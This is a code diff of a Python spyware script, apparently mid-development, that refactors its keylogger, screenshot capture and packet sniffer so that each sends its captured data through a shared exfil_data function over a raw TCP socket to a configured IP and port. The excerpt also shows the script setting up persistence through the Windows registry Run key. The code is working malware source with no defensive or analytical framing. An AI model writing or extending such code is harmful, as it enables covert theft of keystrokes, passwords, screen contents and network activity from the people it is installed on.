@@ -13,10 +13,12 @@ import io
 
 TARGET_IP = "127.0.0.1"
 TARGET_PORT = 4444
-TARGET_FOLDER = r"C:\Users\<User>\Desktop"
+KEYLOG_DIR = r"C:\Users\<User>\Desktop"
+SCREENSHOT_DIR = r"C:\Users\<User>\Desktop"
+PACKETS_DIR = r"C:\Users\<User>\Desktop"
+KEYLOG_INTERVAL = 10
 SCREENSHOT_INTERVAL = 60
 NETWORK_SNIFFER_TIMEOUT = 60
-KEYLOG_INTERVAL = 10
 
 def insertRunValue(sScriptPath, sValueName):
     sRegistryKey = winreg.HKEY_CURRENT_USER
@@ -108,7 +110,6 @@ def exfil_data(data):
     try:
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             s.connect((TARGET_IP, TARGET_PORT))
-            s.sendall(f"[folder]{TARGET_FOLDER}\n".encode())
             s.sendall(data)
     except:
         pass
@@ -144,7 +145,7 @@ def start_keylogger():
             stamp = time.strftime("%Y-%m-%d %H:%M:%S")
             time.sleep(KEYLOG_INTERVAL)
             if current_log:
-                data = f"[{stamp}] {''.join(current_log)}\n".encode()
+                data = f"[keylog]{KEYLOG_DIR}\n[{stamp}] {''.join(current_log)}\n".encode()
                 exfil_data(data)
                 current_log.clear()
     listener = keyboard.Listener(on_press=on_press)
@@ -157,34 +158,22 @@ def capture_screenshots():
     while True:
         shot = pyautogui.screenshot()
         stamp = time.strftime("%Y%m%d_%H%M%S", time.localtime())
-        data_stream = io.BytesIO()
-        shot.save(data_stream, format="PNG")
-        try:
-            header = f"[folder]{TARGET_FOLDER}\n[screenshot]{stamp}\n".encode()
-            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                s.connect((TARGET_IP, TARGET_PORT))
-                s.sendall(header)
-                s.sendall(data_stream.getvalue())
-        except:
-            pass
-        data_stream.close()
+        stream = io.BytesIO()
+        shot.save(stream, format="PNG")
+        data = b"[screenshot]" + SCREENSHOT_DIR.encode() + b"\n" + stamp.encode() + b"\n" + stream.getvalue()
+        exfil_data(data)
+        stream.close()
         time.sleep(SCREENSHOT_INTERVAL)
 
 def start_sniffer():
     def packet_callback(packet):
         stamp = time.strftime("%Y-%m-%d %H:%M:%S")
-        data = f"[folder]{TARGET_FOLDER}\n[packet][{stamp}] {packet.summary()}\n".encode()
-        try:
-            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                s.connect((TARGET_IP, TARGET_PORT))
-                s.sendall(data)
-        except:
-            pass
+        data = f"[packets]{PACKETS_DIR}\n[{stamp}] {packet.summary()}\n".encode()
+        exfil_data(data)
     sniff(prn=packet_callback, store=0, timeout=NETWORK_SNIFFER_TIMEOUT)
 
 def main():
     sScriptPath = os.path.abspath(__file__)
-    sScriptDirectory = os.path.dirname(sScriptPath)
     if "--startup" in sys.argv:
         sValueName = getCurrentValueName(sScriptPath)
         sUpdatedScriptPath = renameScript(sScriptPath)
